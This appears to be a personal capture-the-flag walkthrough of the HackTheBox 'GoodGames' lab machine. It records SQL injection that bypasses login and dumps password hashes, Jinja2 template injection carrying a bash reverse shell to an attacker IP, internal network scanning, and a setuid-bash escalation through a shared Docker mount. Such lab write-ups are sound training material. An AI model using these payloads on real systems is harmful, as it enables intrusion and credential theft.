#linux 

# Enumeration
## nmap
```
nmap -sC -sV goodgames.htb 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 10:09 EST
Nmap scan report for goodgames.htb (10.129.88.0)
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.93 seconds
```

## Feroxbuster
```
200      GET      728l     2070w    33387c http://goodgames.htb/signup
200      GET      730l     2069w    32744c http://goodgames.htb/forgot-password
403      GET        9l       28w      278c http://goodgames.htb/server-status
200      GET      287l      620w    10524c http://goodgames.htb/coming-soon
200      GET      267l      553w     9294c http://goodgames.htb/password-reset
```

## Check the website

![[Pasted image 20230222005844.png]]
Flask, so python?

### signin
![[Pasted image 20230222001214.png]]

### Signup
![[Pasted image 20230222003933.png]]

![[Pasted image 20230222005226.png]]

### posts
User: Wolfenstein,Hitman, Witch Murder,


## Check header
```
curl -I http://goodgames.htb
HTTP/1.1 200 OK
Date: Tue, 21 Feb 2023 15:30:38 GMT
Server: Werkzeug/2.0.2 Python/3.9.2
Content-Type: text/html; charset=utf-8
Content-Length: 85107
```


### searchsploit
```
searchsploit werkzeug 2.0.2
Exploits: No Results
Shellcodes: No Results
```

# Foothold
## SQL Injection

### signin
#### bypass
`email=' or 1=1-- -&password=tofu` this works to bypass login.
double dash is for comment, single dash is for protect from trailing space.
before I have registered someone named toh and tofu
```
                    <h2 class="h4">Welcome admintohtofu</h2>
```

It is possible that all the usernames are displayed?

### Union injection
#### email=' union all select 1,2,3,4-- -&password=tofu
```
                   <h2 class="h4">Welcome 4</h2>
```

### Get database name
#### email=' union select 1,2,3,database()-- -&password=tofu

we need to have match the number of columns when we try injection, so we start with 
```
                   <h2 class="h4">Welcome main</h2>
```


### Check all schemes
#### email=' union all select 1,2,3, concat(schema_name,':') from information_schema.schemata-- -&password=tofu
need to put concat for field padding, schema name is main?
```
                   <h2 class="h4">Welcome information_schema:main:</h2>
```

### Check all tables
#### email=' union all select 1,2,3, concat(table_name,':') from information_schema.tables where table_schema = 'main'-- -&password=tofu

```
                   <h2 class="h4">Welcome blog:blog_comments:user:</h2>
```

### Get column name
#### email=' union all select 1,2,3, concat(column_name,':') from information_schema.columns where table_name = 'user'-- -&password=tofu
```
                   <h2 class="h4">Welcome id:email:password:name:</h2>
```

### Get user items
#### email=' union all select 1,2,3, concat(id,':',email,':',password,':',name,':') from user-- -&password=tofu

```
<h2 class="h4">Welcome 1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec:admin:2:toh@gmail.com:eaee0cdd2c82e89f15078ff33ca37e46:toh:3:t@gmail.com:5df7f1701b778d03d57456afea567922:tofu:</h2>
```

### Admin password
```
1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec:admin
```

### Crack hash
https://crackstation.net/
it is md5 and the result is superadministrator'

## Login as admin

![[Pasted image 20230222144047.png]]

There is a new icon
http://internal-administration.goodgames.htb/

#### subdomain
add `internal-administration.goodgames.htb` to /etc/hosts

#### flask login
![[Pasted image 20230222145605.png]]

#### Volt login

![[Pasted image 20230222150042.png]]

Themesverg - Coded by AppSeed

## SSTI

![[Pasted image 20230222150458.png]]

### SSTI checklist
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
`${7*7}` did not work but `{{7*7}}` worked
![[Pasted image 20230222152701.png]]

`{{7*'7'}}` works as well
![[Pasted image 20230222153235.png]]


`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
![[Pasted image 20230222153748.png]]

## Reverse shell

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.17/1234 0>&1"').read() }}`

and wait on kali machine
```
nc -lvpn 1234
```

### Upgrade shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
## User flag as augustus

```
root@3a453ab39d3d:/home/augustus# cat user.txt
cat user.txt
```

# Privilege Escalation???
## Enumeration

### dockerenv
```
root@3a453ab39d3d:/# ls -al
ls -al
total 88
drwxr-xr-x   1 root root 4096 Nov  5  2021 .
drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
-rwxr-xr-x   1 root root    0 Nov  5  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
drwxr-xr-x   5 root root  340 Feb 22 10:15 dev
drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
drwxr-xr-x   1 root root 4096 Nov  5  2021 home
drwxr-xr-x   1 root root 4096 Nov 16  2018 lib
drwxr-xr-x   2 root root 4096 Nov 12  2018 lib64
drwxr-xr-x   2 root root 4096 Nov 12  2018 media
drwxr-xr-x   2 root root 4096 Nov 12  2018 mnt
drwxr-xr-x   2 root root 4096 Nov 12  2018 opt
dr-xr-xr-x 177 root root    0 Feb 22 10:15 proc
drwx------   1 root root 4096 Nov  5  2021 root
drwxr-xr-x   3 root root 4096 Nov 12  2018 run
drwxr-xr-x   1 root root 4096 Nov  5  2021 sbin
drwxr-xr-x   2 root root 4096 Nov 12  2018 srv
dr-xr-xr-x  13 root root    0 Feb 22 10:22 sys
drwxrwxrwt   1 root root 4096 Nov  5  2021 tmp
drwxr-xr-x   1 root root 4096 Nov 12  2018 usr
drwxr-xr-x   1 root root 4096 Nov 12  2018 var
```

docker env is a little bit weird with zero size

### Check users
```
root@3a453ab39d3d:/# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

```
root@3a453ab39d3d:/home/augustus# ls -al
ls -al
total 24
drwxr-xr-x 2 1000 1000 4096 Nov  3  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 1000 1000   33 Feb 22 10:16 user.txt
```

### check mount
```
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
```
augustus was there

actually I am in the container
```
root@3a453ab39d3d:/backend# ls
ls
Dockerfile
project
requirements.txt
```
### ifconfig
```
root@3a453ab39d3d:/home/augustus# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 557  bytes 84085 (82.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 419  bytes 214014 (208.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### ping scan
first two numbers are 172.19
```
root@3a453ab39d3d:/backend# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
<grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.104 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.026 ms

```

### port scan

```
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

## ssh to augustus@goodgames

```
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
root@3a453ab39d3d:/backend# python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$   
```

### hostname
```
augustus@GoodGames:~$ hostname -I
hostname -I
10.129.113.82 172.17.0.1 172.19.0.1 dead:beef::250:56ff:feb9:e276 
```

### sudo -l
```
augustus@GoodGames:~$ sudo -l
sudo -l
-bash: sudo: command not found
```

### check docker
```
augustus@GoodGames:~$ ps aux | grep docker
ps aux | grep docker
root       708  0.0  2.1 1457424 86212 ?       Ssl  10:14   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1143  0.0  0.1 1148904 7524 ?        Sl   10:15   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
augustus  2608  0.0  0.0   6248   704 pts/0    S+   11:01   0:00 grep docker
```

## Created files in container and host

### Container
```
root@3a453ab39d3d:/home/augustus# ls -al
ls -al                                                                                               
total 32                                                                                             
drwxr-xr-x 2 1000 1000 4096 Feb 22 11:31 .                                                           
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..                                                          
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null                                  
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout                                                
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc                                                     
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile                                                    
-rw-r--r-- 1 1000 1000    5 Feb 22 11:30 tofu1.txt                                                   
-rw-r--r-- 1 root root    6 Feb 22 11:31 tofu2.txt                                                   
-rw-r----- 1 1000 1000   33 Feb 22 10:16 user.txt
root@3a453ab39d3d:/home/augustus# 
```

### Host
```
augustus@GoodGames:~$ ls -al
ls -al                                                                                               
total 32                                                                                             
drwxr-xr-x 2 augustus augustus 4096 Feb 22 11:31 .                                                   
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..                                                  
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null                          
-rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout                                        
-rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc                                             
-rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile                                            
-rw-r--r-- 1 augustus augustus    5 Feb 22 11:30 tofu1.txt                                           
-rw-r--r-- 1 root     root        6 Feb 22 11:31 tofu2.txt                                           
-rw-r----- 1 augustus augustus   33 Feb 22 10:16 user.txt
```

It seems like we can create a file owned by root in the container and we can see all the files between the two.

## Run bash as root

Since they share the same folder and one has a root permission, we can copy binbash in augustus then change owner of binbash from augustus to root, then change permission.
now augustus can run the bash and it will be run as root, so we can perform privilege escalation

On augustus
cp /bin/bash .

On container
chown root:root bash
chmod 4777 bash

On augustus
./bash -p